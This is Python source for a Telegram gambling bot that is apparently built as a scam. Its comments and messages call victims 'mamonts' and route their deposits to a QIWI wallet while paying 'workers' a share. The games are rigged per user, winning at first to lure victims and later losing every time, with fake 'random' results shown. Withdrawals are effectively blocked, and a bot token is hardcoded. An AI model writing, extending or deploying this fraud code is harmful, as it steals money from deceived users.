import telebot
from telebot import types

from SimpleQIWI import *
import json

from time import sleep

import datetime, threading, database, keyboard, configparser, function, random
from function import create_promo, float_2f, bill_create, share_pay

from datetime import timedelta

bot = telebot.TeleBot('5950658208:AAHANZJpFZK43qihGgUFlTBZ8xOel4B3I0Q') # токен казино
db = database



support = '@anonimiusrrr' # @username саппорта по казино
chat_workers = -100185041413 # ID чата воркеров
chat_channel = -100185041413 # ID канала залетов
id_bot = 5950658208 # ID бота казино

in_deposit = []

# Обновление никнейма

def set_nickname(message):
	try:
			
		if message.from_user.id != id_bot:

			if message.from_user.username is not None:
				db.casino_update_username(message.chat.id, f'@{message.from_user.username}')
			elif message.from_user.first_name is not None:
				db.casino_update_username(message.chat.id, message.from_user.first_name)

	except Exception as e:
		print(e)

# Установление кода

def set_code(message):
	try:

		exists = db.workers_exists_code(message.text)

		if exists is not False:

			db.casino_update_invite(message.chat.id, message.text)
			bot.send_message(message.chat.id, f"Добро пожаловать, <b>{message.from_user.first_name}</b>\nУ нас очень большой выбор вида игр, которые подойдут для каждого пользователя",
				parse_mode="html", reply_markup = keyboard.casino_keyboard())

			new_referal(message)
		else:
			message = bot.send_message(message.chat.id, f"⚠️ Введите <b>правильный код</b> пригласившего вас человека", parse_mode="html")
			bot.register_next_step_handler(message, set_code)

	except Exception as e:
		print(e)

# Уведомления

def new_referal(message):
	try:
		

		code = db.casino_code(message.chat.id)
		username = db.casino_username(message.chat.id)
		worker_id = db.workers_user_id(code)

		sended_message = f'💞 Твой <b>новый</b> мамонт - {username}'
		function.new_referal(worker_id, sended_message)

	except Exception as e:
		print(e)

def new_deposit(message, value):
	try:
		code = db.casino_code(message.chat.id)
		username = db.casino_username(message.chat.id)
		worker_id = db.workers_user_id(code)

		sended_message = f'💳 Мамонт на <b>оплате</b>\n\nПользователь: {username}\nСумма перевода: {value} ₽'
		function.new_deposit(worker_id, message.chat.id, value, sended_message)
	except Exception as e:
		print(e)

def new_profit(call, value):
	try:
		code = db.casino_code(call.message.chat.id)
		username = db.casino_username(call.message.chat.id)
		worker_id = db.workers_user_id(code)
		username_worker = db.workers_username(worker_id)

		share = share_pay(value)
		db.workers_add_profit(worker_id, share)

		sended_message = f'💞 Успешная <b>оплата</b>\nТвоя доля ~ <b>{share}</b>\n\n💸 Сумма платежа: <b>{value}</b> ₽\n👨‍💻 Мамонт: {username}'
		function.new_profit(worker_id, chat_workers, chat_channel, value, sended_message, username_worker, share)
	except Exception as e:
		print(e)	

# Пополнение

def status_deposit(call, value, billId):
	try:
		

		fake = db.casino_fake(call.message.chat.id)

		if fake != 0:

			db.casino_fake_clear(call.message.chat.id)
			db.casino_add_balance(call.message.chat.id, fake)
			db.casino_add_deposit(call.message.chat.id)
			in_deposit.remove(str(call.message.chat.id))

			bot.send_message(call.message.chat.id, f'Баланс пополнен на сумму <b>{fake}</b> ₽', parse_mode = 'html', reply_markup = keyboard.casino_keyboard())
		else:

			config = configparser.ConfigParser()
			config.read("default.ini")
			phone = config['Telegram']['phone']
			token = config['Telegram']['token']

			api = QApi(phone = phone, token = token)
			payments = api.payments['data']

			is_pay = 0
			for payment in payments:

				if (str(payment['comment']) == str(billId)):

					if str(value) == str(payment['sum']['amount']):

						db.casino_add_balance(call.message.chat.id, value)
						db.casino_add_deposit(call.message.chat.id)
						in_deposit.remove(str(call.message.chat.id))
						is_pay = 1

						bot.send_message(call.message.chat.id, f'Баланс пополнен на сумму <b>{value}</b> ₽', parse_mode = 'html', reply_markup = keyboard.casino_keyboard())

						new_profit(call, value)
			if is_pay == 0:
				bot.answer_callback_query(callback_query_id=call.id, show_alert=False, text="Платеж не найден")

	except Exception as e:
		raise e

def cancel_deposit(message):
	try:
		chat_id = message.chat.id

		if (str(chat_id) in in_deposit):

			in_deposit.remove(str(chat_id))
			bot.send_message(chat_id, 'Пополнение <b>отменено</b>', parse_mode = 'html', reply_markup = keyboard.casino_keyboard())

		else:
			bot.send_message(chat_id, 'Сессия была <b>отменена</b> или <b>не найдена</b>', parse_mode = 'html', reply_markup = keyboard.casino_keyboard())

	except Exception as e:
		print(e)

def deposit_timeout(message):
	try:
		end = datetime.datetime.now() + timedelta(minutes = 10)

		thread = 1
		while (thread == 1):
			if (datetime.datetime.now() > end):
				bot.delete_message(chat_id=message.chat.id, message_id=message.message_id)
				in_deposit.remove(str(message.chat.id))
				thread = 0
			elif (str(message.chat.id) not in in_deposit):
				bot.delete_message(chat_id=message.chat.id, message_id=message.message_id)
				thread = 0

			sleep(0.5)
	except Exception as e:
		print(e)

def casino_deposit(message):
	try:
		
		chat_id = message.chat.id

		if (str(chat_id) in in_deposit):
			bot.send_message(message.chat.id, f'У вас уже есть <b>активная</b> сессия', parse_mode = 'html')
		elif message.text.isdigit():

			value = int(message.text)

			if (value == 1) or (value <= 5000 and value >= 250):

				config = configparser.ConfigParser()
				config.read("default.ini")
				phone = config['Telegram']['phone']
				token = config['Telegram']['token']

				code = db.casino_code(chat_id)
				billId = f'{bill_create(6)}_{code}'

				inline_keyboard = types.InlineKeyboardMarkup(row_width = 2)
				inline_1 = types.InlineKeyboardButton(text = "💳 Оплатить картой", url = f'https://qiwi.com/payment/form/99?extra[%27account%27]=+{phone}&amountInteger={message.text}&amountFraction=0&currency=643&extra[%27comment%27]={billId}&blocked[0]=account&blocked[1]=comment')
				inline_2 = types.InlineKeyboardButton(text = "Проверить оплату", callback_data = f'STATUS_{value}_{billId}')
				inline_keyboard.add(inline_1, inline_2)

				in_deposit.append(str(chat_id))
				message_payment = bot.send_message(chat_id, f'Переведите <b>{value}</b> ₽ на QIWI Кошелек\nСчет действителен 10 минут, его можно отменить'
					+ f'\n\nНомер: {phone}\nКомментарий: <code>{billId}</code>\n\n⚠️ Учтите, что без комментария ваш платеж <b>не будет зачитан</b>', parse_mode = 'html', reply_markup = inline_keyboard)

				new_deposit(message, value)

				Thread = threading.Thread(target = deposit_timeout, args = (message_payment,))
				Thread.start()
		elif message.text == 'Отменить пополнение':
			cancel_deposit(message)
		else:
			bot.send_message(message.chat.id, f'⚠️ Минимальная сумма пополнения - <b>250</b> ₽, максимальная - <b>5000</b> ₽', parse_mode="Markdown")

	except Exception as e:
		raise e

# Вывод

def casino_receive(message, balance):
	try:
		

		user_phone = message.text

		user_code = db.casino_code(message.chat.id)
		worker_id = db.workers_user_id(user_code)
		worker_phone = db.workers_phone(worker_id)


		if user_phone != worker_phone:
			bot.send_message(message.chat.id, '⚠️ Введите реквизиты с которых было <b>последнее пополнение</b>', parse_mode = 'html')
		else:

			code = db.casino_code(message.chat.id)
			username = db.casino_username(message.chat.id)
			worker_id = db.workers_user_id(code)

			sended_message = f'💸 Мамонт подал заявку на <b>вывод</b>\n\nПользователь: {username}\nНа выводе: {balance} ₽'
			function.to_receive(worker_id, message.chat.id, sended_message)

			db.casino_to_receive(message.chat.id)
			bot.send_message(message.chat.id, f'📨 Заявка была <b>отправлена</b>\nНа выводе: {balance} ₽', parse_mode = 'html')

	except Exception as e:
		print(e)

# Промо

def casino_promo(message):
	try:


		exists = db.promo_exists(message.text)

		if exists is not False:

			pay = db.promo_pay(message.text)
			db.casino_add_balance(message.chat.id, pay)
			db.promo_delete(message.text)

			bot.send_message(message.chat.id, f'Вы обналичили <b>промокод</b> на сумму <b>{pay}</b> ₽',
				parse_mode = 'html')
		else:
			bot.send_message(message.chat.id, f'⚠️ Промокод {message.text} <b>не найден</b>', parse_mode = 'html')




	except Exception as e:
		print(e)


# Игры

def nvuti_choice(message, bet):
	try:
		chat_id = message.chat.id
		status = db.casino_status(chat_id)
		array = ['< 50', '= 50', '> 50']
		choice = message.text

		if choice in array:

			if (status == 2):

				kk = random.randint(0, 100)

				if choice == '< 50':

					if kk < 50:
						win = function.float_2f(float(bet) * 2)
						db.casino_add_win(chat_id, win)

						bot.send_message(chat_id, f'Вы <b>выиграли</b>! Выпавшее число - <b>{kk}</b>', parse_mode = 'html')
					else:
						bet = function.float_2f(float(bet))
						db.casino_add_lose(chat_id, bet)

						bot.send_message(chat_id, f'Вы <b>проиграли</b>! Выпал(а) - <b>{choice}</b>', parse_mode = 'html')
				if choice == '= 50':

					if kk == 50:
						win = function.float_2f(float(bet) * 10)
						db.casino_add_win(chat_id, win)

						bot.send_message(chat_id, f'Вы <b>выиграли</b>! Выпавшее число - <b>{kk}</b>', parse_mode = 'html')
					else:
						bet = function.float_2f(float(bet))
						db.casino_add_lose(chat_id, bet)

						bot.send_message(chat_id, f'Вы <b>проиграли</b>! Выпал(а) - <b>{choice}</b>', parse_mode = 'html')
				if choice == '> 50':

					if kk > 50:
						win = function.float_2f(float(bet) * 2)
						db.casino_add_win(chat_id, win)

						bot.send_message(chat_id, f'Вы <b>выиграли</b>! Выпавшее число - <b>{kk}</b>', parse_mode = 'html')
					else:
						bet = function.float_2f(float(bet))
						db.casino_add_lose(chat_id, bet)

						bot.send_message(chat_id, f'Вы <b>проиграли</b>! Выпал(а) - <b>{choice}</b>', parse_mode = 'html')
			elif (status == 1):

				if choice == '< 50':

					win = function.float_2f(float(bet) * 2)
					db.casino_add_win(chat_id, win)

					kk = random.randint(0, 49)
					bot.send_message(chat_id, f'Вы <b>выиграли</b>! Выпавшее число - <b>{kk}</b>', parse_mode = 'html')
				elif choice == '= 50':
					win = function.float_2f(float(bet) * 10)
					db.casino_add_win(chat_id, win)

					bot.send_message(chat_id, f'Вы <b>выиграли</b>! Выпавшее число - <b>50</b>', parse_mode = 'html')
				elif choice == '> 50':
					win = function.float_2f(float(bet) * 2)
					db.casino_add_win(chat_id, win)

					kk = random.randint(51, 100)
					bot.send_message(chat_id, f'Вы <b>выиграли</b>! Выпавшее число - <b>{kk}</b>', parse_mode = 'html')
			elif (status == 3):
				if choice == '< 50':

					bet = function.float_2f(float(bet))
					db.casino_add_lose(chat_id, bet)

					kk = random.randint(51, 100)
					bot.send_message(chat_id, f'Вы <b>проиграли</b>! Выпавшее число - <b>{kk}</b>', parse_mode = 'html')
				elif choice == '= 50':
					bet = function.float_2f(float(bet))
					db.casino_add_lose(chat_id, bet)

					kk = random.randint(0, 49)

					bot.send_message(chat_id, f'Вы <b>проиграли</b>! Выпавшее число - <b>{kk}</b>', parse_mode = 'html')
				elif choice == '> 50':
					bet = function.float_2f(float(bet))
					db.casino_add_lose(chat_id, bet)

					kk = random.randint(0, 49)
					bot.send_message(chat_id, f'Вы <b>проиграли</b>! Выпавшее число - <b>{kk}</b>', parse_mode = 'html')


			balance = function.float_2f(db.casino_balance(chat_id))
			message = bot.send_message(chat_id, f'Введите <b>сумму</b> ставки\nДоступно: <b>{balance}</b> ₽', parse_mode = 'html', reply_markup = keyboard.endgame_keyboard())
			bot.register_next_step_handler(message, nvuti, balance)

	except Exception as e:
		print(e)

def nvuti(message, balance):
	try:
		chat_id = message.chat.id
		if (function.is_float(message.text)):

			bet = float_2f(message.text)

			if (bet <= balance) and (bet > 10):

				message = bot.send_message(chat_id, f'Ставка <b>засчитана</b>, выпадет рандомное число от 1 до 100, выберите исход события', parse_mode = 'html', reply_markup = keyboard.nvuti_keyboard())
				bot.register_next_step_handler(message, nvuti_choice, bet)
			else:
				message = bot.send_message(message.chat.id, f'⚠️ <b>Не достаточно</b> средств или ставка <b>меньше</b> 10 ₽\nВведите <b>сумму</b> ставки, доступно: <b>{balance}</b> ₽', parse_mode="html")
				bot.register_next_step_handler(message, nvuti, balance)
		elif message.text == 'Завершить игру':
			bot.send_message(chat_id, f'Вы вернулись в <b>список</b> игр', parse_mode="html", reply_markup=keyboard.game_keyboard())
		else:
			message = bot.send_message(chat_id, f'Введите <b>сумму</b> ставки\nДоступно: {balance} ₽', parse_mode = 'html', reply_markup = keyboard.endgame_keyboard())
			bot.register_next_step_handler(message, nvuti, balance)

	except Exception as e:
		print(e)
		message = bot.send_message(chat_id, f'Введите <b>сумму</b> ставки\nДоступно: {balance} ₽', parse_mode = 'html', reply_markup = keyboard.endgame_keyboard())
		bot.register_next_step_handler(message, nvuti, balance)

def crash_start(call, bet, k):
	try:
		k = int(k)
		chat_id = call.message.chat.id
		balance = float_2f(db.casino_balance(chat_id))
		status = db.casino_status(chat_id)

		if (float(bet) <= balance):

			if (status == 2):

				kk = random.randint(2, 30)
				end = 0

				thread = 1
				while (thread == 1):

					if (k == end):
						win = function.float_2f(float(bet) * kk)
						db.casino_add_win(chat_id, win)

						bot.send_message(chat_id, f'Вы <b>выиграли</b>! Коэффицент игры - <b>{kk}</b>', parse_mode = 'html', reply_markup = keyboard.game_keyboard())

						thread = 0
					elif (end == kk):
						bet = function.float_2f(float(bet))
						db.casino_add_lose(chat_id, bet)

						bot.send_message(chat_id, f'Вы <b>проиграли</b>! Коэффицент игры - <b>{kk}</b>', parse_mode = 'html', reply_markup = keyboard.game_keyboard())

						thread = 0
					else:
						end += 1
						bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=f'Игра <b>начата</b>\n\nВаша ставка: <b>{bet}</b> ₽\nВаш коэффицент: <b>{k}</b>\n\nКоэффицент - <b>{end}</b>', parse_mode = 'html')
			elif (status == 1):

				kk = k
				end = 0

				thread = 1
				while (thread == 1):

					if (k == end):
						win = function.float_2f(float(bet) * kk)
						db.casino_add_win(chat_id, win)

						bot.send_message(chat_id, f'Вы <b>выиграли</b>! Коэффицент игры - <b>{kk}</b>', parse_mode = 'html', reply_markup = keyboard.game_keyboard())

						thread = 0
					else:
						end += 1
						bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=f'Игра <b>начата</b>\n\nВаша ставка: <b>{bet}</b> ₽\nВаш коэффицент: <b>{k}</b>\n\nКоэффицент - <b>{end}</b>', parse_mode = 'html')
			elif (status == 3):

				kk = k - 2
				end = 0

				thread = 1
				while (thread == 1):

					if (end == kk):
						bet = function.float_2f(float(bet))
						db.casino_add_lose(chat_id, bet)

						bot.send_message(chat_id, f'Вы <b>проиграли</b>! Коэффицент игры - <b>{kk}</b>', parse_mode = 'html', reply_markup = keyboard.game_keyboard())

						thread = 0
					else:
						end += 1
						bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=f'Игра <b>начата</b>\n\nВаша ставка: <b>{bet}</b> ₽\nВаш коэффицент: <b>{k}</b>\n\nКоэффицент - <b>{end}</b>', parse_mode = 'html')


		else:
			bot.send_message(chat_id, f'⚠️ <b>Не достаточно</b> средств для старта игры\nДоступно: <b>{balance}</b> ₽', parse_mode = 'html')

	except Exception as e:
		print(e)

def crash_choice(message, bet):
	try:
		chat_id = message.chat.id
		k = message.text
		array = [2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30]
		bet = float_2f(bet)

		if k.isdigit():

			if int(k) in array:

				inline_keyboard = types.InlineKeyboardMarkup(row_width = 2)
				inline_1 = types.InlineKeyboardButton(text = "Начать игру", callback_data = f'CRASH_{bet}_{k}')
				inline_keyboard.add(inline_1)

				bot.send_message(chat_id, f'Игра <b>готова</b>\n\nВаша ставка: <b>{bet}</b> ₽\nВаш коэффицент: <b>{k}</b>\n\nНажмите на кнопку «Начать игру»', parse_mode = 'html',
					reply_markup = inline_keyboard)

			else:
				message = bot.send_message(chat_id, 'Выберите коэффицент на котором хотите забрать ставку от 2 до 30', parse_mode = 'html')
				bot.register_next_step_handler(message, crash_choice, bet)

		elif message.text == 'Завершить игру':
			bot.send_message(chat_id, f'Вы вернулись в <b>список</b> игр', parse_mode="html", reply_markup = keyboard.game_keyboard())		


	except Exception as e:
		print(e)

def crash(message, balance):
	try:
		

		chat_id = message.chat.id
		if (function.is_float(message.text)):

			bet = float_2f(message.text)

			if (bet <= balance) and (bet > 10):

				message = bot.send_message(chat_id, 'Ставка <b>засчитана</b>, выберите коэффицент на котором хотите забрать ставку от 2 до 30', parse_mode = 'html')
				bot.register_next_step_handler(message, crash_choice, bet)
			else:
				message = bot.send_message(message.chat.id, f'⚠️ <b>Не достаточно</b> средств или ставка <b>меньше</b> 10 ₽\nВведите <b>сумму</b> ставки, доступно: <b>{balance}</b> ₽', parse_mode="html")
				bot.register_next_step_handler(message, crash, balance)
		elif message.text == 'Завершить игру':
			bot.send_message(chat_id, f'Вы вернулись в <b>список</b> игр', parse_mode="html", reply_markup = keyboard.game_keyboard())
		else:
			message = bot.send_message(chat_id, f'Введите <b>сумму</b> ставки\nДоступно: {balance} ₽', parse_mode = 'html', reply_markup = keyboard.endgame_keyboard())
			bot.register_next_step_handler(message, crash, balance)

	except:
		message = bot.send_message(chat_id, f'Введите <b>сумму</b> ставки\nДоступно: {balance} ₽', parse_mode = 'html', reply_markup = keyboard.endgame_keyboard())
		bot.register_next_step_handler(message, crash, balance)

def coinflip_choice(message, bet):
	try:
		

		chat_id = message.chat.id
		status = db.casino_status(chat_id)
		array = ['Орел', 'Решка']
		choice = random.choice(array)

		if message.text in array:
			if (status == 1):
				win = function.float_2f(float(bet) * 2)
				db.casino_add_win(chat_id, win)

				bot.send_message(chat_id, f'Вы <b>выиграли</b>! Выпал(а) - <b>{message.text}</b>', parse_mode = 'html')
			elif (status == 2):
				if message.text == choice:

					win = function.float_2f(float(bet) * 2)
					db.casino_add_win(chat_id, win)

					bot.send_message(chat_id, f'Вы <b>выиграли</b>! Выпал(а) - <b>{choice}</b>', parse_mode = 'html')
				else:

					bet = function.float_2f(float(bet))
					db.casino_add_lose(chat_id, bet)

					bot.send_message(chat_id, f'Вы <b>проиграли</b>! Выпал(а) - <b>{choice}</b>', parse_mode = 'html')
			elif (status == 3):
				bet = function.float_2f(float(bet))
				db.casino_add_lose(chat_id, bet)

				if message.text == 'Орел':
					choice = message.text.replace('Орел', 'Решка')
				else:
					choice = message.text.replace('Решка', 'Орел')

				bot.send_message(chat_id, f'Вы <b>проиграли</b>! Выпал(а) - <b>{choice}</b>', parse_mode = 'html')

			balance = function.float_2f(db.casino_balance(chat_id))
			message = bot.send_message(chat_id, f'Введите <b>сумму</b> ставки\nДоступно: <b>{balance}</b> ₽', parse_mode = 'html', reply_markup = keyboard.endgame_keyboard())
			bot.register_next_step_handler(message, coinflip, balance)

	except Exception as e:
		print(e)

def coinflip(message, balance):
	try:
		

		chat_id = message.chat.id
		if (function.is_float(message.text)):

			bet = float_2f(message.text)

			if (bet <= balance) and (bet > 10):

				message = bot.send_message(chat_id, 'Ставка <b>засчитана</b>, выберите на кого поставите', parse_mode = 'html', reply_markup = keyboard.coinflip_keyboard())
				bot.register_next_step_handler(message, coinflip_choice, bet)
			else:
				message = bot.send_message(message.chat.id, f'⚠️ <b>Не достаточно</b> средств или ставка <b>меньше</b> 10 ₽\nВведите <b>сумму</b> ставки, доступно: <b>{balance}</b> ₽', parse_mode="html")
				bot.register_next_step_handler(message, coinflip, balance)
		elif message.text == 'Завершить игру':
			bot.send_message(chat_id, f'Вы вернулись в <b>список</b> игр', parse_mode="html", reply_markup=keyboard.game_keyboard())
		else:
			message = bot.send_message(chat_id, f'Введите <b>сумму</b> ставки\nДоступно: {balance} ₽', parse_mode = 'html', reply_markup = keyboard.endgame_keyboard())
			bot.register_next_step_handler(message, coinflip, balance)

	except:
		message = bot.send_message(chat_id, f'Введите <b>сумму</b> ставки\nДоступно: {balance} ₽', parse_mode = 'html', reply_markup = keyboard.endgame_keyboard())
		bot.register_next_step_handler(message, coinflip, balance)
